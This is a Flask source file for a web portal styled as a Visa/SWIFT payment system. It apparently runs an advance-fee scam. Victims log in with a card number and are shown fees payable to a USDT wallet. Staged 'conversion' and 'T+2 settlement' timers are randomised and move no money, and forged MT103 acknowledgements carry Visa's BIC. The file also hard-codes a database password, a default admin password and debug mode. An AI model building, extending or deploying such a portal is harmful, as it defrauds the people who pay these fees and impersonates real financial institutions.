import os
import json
import random
from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, session
from werkzeug.utils import secure_filename
from models import db, FileRecord
from datetime import datetime, timedelta
from dotenv import load_dotenv
from flask_migrate import Migrate

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', 'default-secret-key')

# ==========================================
# --- PRODUCTION DATABASE CONFIGURATION ---
# ==========================================
db_url = os.getenv('DATABASE_URL', 'postgresql://visa_yqla_user:DYguQGdSGspIDSeeQ5IrV6TjmOPkABd2@dpg-dba428fbtjjs73dn2tn0-a/visa_yqla')

# FIX: Use 'postgresql+psycopg://' to force SQLAlchemy to use psycopg v3
if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql+psycopg://", 1)
elif db_url.startswith("postgresql://"):
    db_url = db_url.replace("postgresql://", "postgresql+psycopg://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_url

# ==========================================
# --- FILE UPLOAD CONFIGURATION ---
# ==========================================
DATA_DIR = '/var/data' if os.path.exists('/var/data') else os.getcwd()
app.config['UPLOAD_FOLDER'] = os.path.join(DATA_DIR, 'uploads')

db.init_app(app)
migrate = Migrate(app, db) # Initialize Flask-Migrate
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Note: You can remove db.create_all() if you rely solely on flask db upgrade
with app.app_context():
    db.create_all()

# ==========================================
# --- SIDEBAR MODULE ROUTES ---
# ==========================================
@app.route('/payment_messages')
def payment_messages(): return render_template('payment_messages.html')
@app.route('/transaction_processing')
def transaction_processing(): return render_template('transaction_processing.html')
@app.route('/system_logs')
def system_logs(): return render_template('system_logs.html')
@app.route('/mt101_workflow')
def mt101_workflow(): return render_template('mt101_workflow.html')
@app.route('/authorization')
def authorization(): return render_template('authorization.html')
@app.route('/compliance')
def compliance(): return render_template('compliance.html')
@app.route('/reports')
def reports(): return render_template('reports.html')
@app.route('/settings')
def settings(): return render_template('settings.html')
@app.route('/user_management')
def user_management(): return render_template('user_management.html')

@app.route('/card_management')
def card_management():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    records = FileRecord.query.order_by(FileRecord.id.desc()).all()
    return render_template('card_management.html', records=records)

# NEW ROUTE: View Individual Card Details
@app.route('/admin/card_details/<int:id>')
def card_details(id):
    if not session.get('admin_logged_in'): 
        return redirect(url_for('admin_login'))
    
    record = FileRecord.query.get_or_404(id)
    return render_template('card_details.html', record=record)

# ==========================================
# --- USER ROUTES ---
# ==========================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        card = request.form.get('card_number').replace(" ", "")
        record = FileRecord.query.filter_by(card_number=card).order_by(FileRecord.id.desc()).first()
        if record:
            session['user_card'] = card
            return redirect(url_for('dashboard'))
        flash("Card not found in the system.", "error")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_card' not in session: return redirect(url_for('login'))
    
    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
    if not record:
        session.pop('user_card', None)
        return redirect(url_for('login'))
    
    # Auto-transition: CONVERTING -> COMPLETED
    if record.status == "CONVERTING" and record.conversion_end and datetime.utcnow() > record.conversion_end:
        record.status = "COMPLETED"
        db.session.commit()

    # Auto-transition: SETTLING -> READY_FOR_CASHOUT
    if record.status == "SETTLING" and record.settlement_end and datetime.utcnow() > record.settlement_end:
        record.status = "READY_FOR_CASHOUT"
        db.session.commit()

    total_fee = record.download_fee + record.conversion_fee
    return render_template('dashboard.html', file=record, total_fee=total_fee, wallet=os.getenv('USDT_TRC20_WALLET'))

@app.route('/user_confirm_payment', methods=['POST'])
def user_confirm_payment():
    if 'user_card' not in session: return redirect(url_for('login'))
    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
    if record.status == "UNPAID":
        record.status = "AWAITING_SERVER"
        db.session.commit()
        flash("Payment submitted. Awaiting Server Confirmation.", "success")
    return redirect(url_for('dashboard'))

@app.route('/initiate_settlement', methods=['POST'])
def initiate_settlement():
    if 'user_card' not in session: return redirect(url_for('login'))
    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
    if record.status == "COMPLETED":
        record.status = "SETTLING"
        record.settlement_start = datetime.utcnow()
        record.settlement_end = datetime.utcnow() + timedelta(days=2) # T+2 = 48 hours
        db.session.commit()
        flash("T+2 Settlement Phase Initiated. Please wait 48 hours.", "success")
    return redirect(url_for('dashboard'))

@app.route('/submit_cashout', methods=['POST'])
def submit_cashout():
    if 'user_card' not in session: return redirect(url_for('login'))
    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
    if record.status == "READY_FOR_CASHOUT":
        record.deposit_code = request.form.get('deposit_code')
        record.auth_code = request.form.get('auth_code')
        record.visa_certificate = request.form.get('visa_certificate')
        record.kyc_verified = True if request.form.get('kyc_verified') else False
        record.status = "CASHOUT_REQUESTED"
        db.session.commit()
        flash("Cashout request submitted. Awaiting Admin final release.", "success")
    return redirect(url_for('dashboard'))

@app.route('/receipt')
def receipt():
    if 'user_card' not in session: return redirect(url_for('login'))
    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
    if record.status not in ['CONVERTING', 'COMPLETED', 'SETTLING', 'READY_FOR_CASHOUT', 'CASHOUT_REQUESTED', 'CASHED_OUT']:
        flash("Receipt is not available yet.", "error")
        return redirect(url_for('dashboard'))
    total_fee = record.download_fee + record.conversion_fee
    return render_template('receipt.html', file=record, total_fee=total_fee, wallet=os.getenv('USDT_TRC20_WALLET'))

@app.route('/download')
def download():
    if 'user_card' not in session: return redirect(url_for('login'))
    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
    if record.status in ["COMPLETED", "SETTLING", "READY_FOR_CASHOUT", "CASHOUT_REQUESTED", "CASHED_OUT"]:
        output_filename = f"MT103_ACK_{record.id}.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], output_filename)
        
        mt103_data = {
            "swift_header": {"message_type": "MT103", "sender_bic": "VISAUS33XXX", "receiver_bic": "KCOOKENAXXX", "session_number": f"2026-{record.id}-{random.randint(1000, 9999)}", "priority": "NORMAL", "delivery_status": "NETWORK ACK"},
            "message_text": {"F20": {"tag": "Transaction Reference Number", "value": f"GSB-{record.id}-VISA-2026"}, "F32A": {"tag": "Value Date", "date": record.payment_time.strftime('%Y/%m/%d') if record.payment_time else datetime.utcnow().strftime('%Y/%m/%d'), "currency": "USD", "amount": f"{record.amount_usd:,.2f}"}, "F50A": {"tag": "Ordering Customer", "account_name": record.card_name, "account_number": record.card_number}, "F59": {"tag": "Beneficiary Customer", "account_name": "JUAN FX TRADERS LIMITED", "account_number": "01102085712001"}}
        }
        with open(filepath, "w") as f: json.dump(mt103_data, f, indent=4)
        return send_from_directory(app.config['UPLOAD_FOLDER'], output_filename, as_attachment=True)
    return "Access Denied: File is not ready yet.", 403

@app.route('/logout')
def logout():
    session.pop('user_card', None)
    session.pop('admin_logged_in', None)
    return redirect(url_for('login'))

# ==========================================
# --- ADMIN ROUTES ---
# ==========================================
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    if request.method == 'POST':
        file = request.files['file']
        if file:
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            try:
                new_record = FileRecord(
                    filename=filename, file_path=filename, amount_usd=float(request.form['amount']),
                    download_fee=float(request.form['d_fee']), conversion_fee=float(request.form['c_fee']),
                    card_number=request.form['card'].replace(" ", ""), card_name=request.form['card_name'], card_type=request.form['card_type']
                )
                db.session.add(new_record)
                db.session.commit()
                flash("File Uploaded and Card Assigned.", "success")
            except Exception as e:
                db.session.rollback()
                flash(f"Database Error: {str(e)}", "error")
    records = FileRecord.query.order_by(FileRecord.id.desc()).all()
    return render_template('admin.html', records=records)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == os.getenv('ADMIN_PASSWORD', 'admin123'):
            session['admin_logged_in'] = True
            return redirect(url_for('admin'))
        flash("Invalid Admin Password", "error")
    return render_template('admin_login.html')

@app.route('/admin/confirm_payment/<int:id>', methods=['POST'])
def confirm_payment(id):
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    record = FileRecord.query.get(id)
    if record.status == "AWAITING_SERVER":
        processing_hours = random.randint(5, 10)
        record.status = "CONVERTING"
        record.payment_time = datetime.utcnow()
        record.conversion_start = datetime.utcnow()
        record.conversion_end = datetime.utcnow() + timedelta(hours=processing_hours)
        db.session.commit()
        flash(f"Payment Approved. {processing_hours}-Hour MT103 Conversion Timer Started.", "success")
    return redirect(url_for('admin'))

@app.route('/admin/force_complete/<int:id>', methods=['POST'])
def force_complete(id):
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    record = FileRecord.query.get(id)
    record.status = "COMPLETED"
    if not record.payment_time: record.payment_time = datetime.utcnow()
    if not record.conversion_start: record.conversion_start = datetime.utcnow()
    db.session.commit()
    flash("Conversion marked as COMPLETED successfully.", "success")
    return redirect(url_for('admin'))

@app.route('/admin/approve_cashout/<int:id>', methods=['POST'])
def approve_cashout(id):
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    record = FileRecord.query.get(id)
    if record.status == "CASHOUT_REQUESTED":
        record.status = "CASHED_OUT"
        db.session.commit()
        flash("Cashout Approved. Funds Released to User.", "success")
    return redirect(url_for('admin'))

@app.route('/admin/delete/<int:id>', methods=['POST'])
def delete_record(id):
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    record = FileRecord.query.get_or_404(id)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], record.filename)
    if os.path.exists(file_path): os.remove(file_path)
    db.session.delete(record)
    db.session.commit()
    flash(f"Transaction {record.filename} deleted.", "success")
    return redirect(url_for('admin'))

if __name__ == '__main__':
    app.run(debug=True)